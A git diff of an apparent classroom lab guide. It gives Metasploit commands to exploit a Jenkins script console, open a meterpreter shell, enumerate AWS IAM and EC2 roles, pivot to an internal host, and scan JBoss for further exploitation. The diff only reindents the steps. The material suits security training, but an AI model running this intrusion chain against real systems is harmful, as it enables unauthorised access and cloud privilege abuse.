@@ -98,9 +98,9 @@ msf >
 
 2. Configure the exploit for use.
 
-In the example below we are using TCP port 10001 to create a listener (`LPORT`). Please contact the instructor to see which port you should be using.
+  In the example below we are using TCP port 10001 to create a listener (`LPORT`). Please contact the instructor to see which port you should be using.
 
-```
+  ```
 > use exploit/multi/http/jenkins_script_console
 > show options
 > set RHOST 52.39.125.179
@@ -109,66 +109,65 @@ In the example below we are using TCP port 10001 to create a listener (`LPORT`).
 > set target 1
 > set payload linux/x86/meterpreter/bind_tcp
 > set LPORT 10001
-```
+  ```
 
 2. Exploit the target and run the shell.
 
-```
+  ```
 > exploit
 > shell
-```
+  ```
 
 3. Run the AWS CLI to determine if this host has IAM permissions.
 
-```
+  ```
 $ aws iam list-users --region us-west-2
-```
+  ```
 
 4. Since this host does not have IAM privileges, let's find a host that does.
 
-Run the AWS CLI to determine the IP address of another host that may have an overly permissive instance profile/role.
+  Run the AWS CLI to determine the IP address of another host that may have an overly permissive instance profile/role.
 
-```
+  ```
 $ aws ec2 describe-instances --region us-west-2
-```
+  ```
 
-Is that shot of JSON to the eye? Try filtering the results, like this:
+  Is that shot of JSON to the eye? Try filtering the results, like this:
 
-```
+  ```
 aws ec2 describe-instances --region us-west-2 --filters Name=iam-instance-profile.arn,Values=arn:aws:iam::717986480831:instance-profile/dso-overly-permissive
-```
+  ```
 
-Make note of this host's IP address. This is target 2.
+  Make note of this host's IP address. This is target 2.
 
-Throw the shell into the background by pressing `ctrl-z`, followed by `y` and `ENTER`. Also throw the Meterpreter shell into the background by again pressing `ctrl-z`, followed by `y` and `ENTER`. Then list your sessions.
+  Throw the shell into the background by pressing `ctrl-z`, followed by `y` and `ENTER`. Also throw the Meterpreter shell into the background by again pressing `ctrl-z`, followed by `y` and `ENTER`. Then list your sessions.
 
-```
+  ```
 > sessions
-```
+  ```
 
-Make note of the session ID, e.g., `1`.
-
+  Make note of the session ID, e.g., `1`.
 
 ## Pivot/Penetrate
 
 1. Add a route to pivot to a host that is deeper inside the network (target 2).
 
-E.g.,
+  E.g.,
 
-```
+  ```
 > route add 10.0.6.0 255.255.255.0 1
-```
+  ```
 
-2. Scan the host you discovered for vulnerabilities.
+  2. Scan the host you discovered for vulnerabilities.
 
-```
+  ```
 > use auxiliary/scanner/http/jboss_vulnscan
 > show options
 > set RHOSTS 10.0.6.165
 > set RPORT 8080
 > show options
 > run
-```
+  ```
 
 2. Search for the JBoss DeploymentFileRepository WAR Deployment exploit. E.g., `search JMXInvokerServlet`.
 
@@ -193,4 +192,4 @@ $ export https_proxy=http://proxy:3128
 $ aws iam list-users --region us-west-2
 ```
 
-What does this mean?
+  What does this mean?
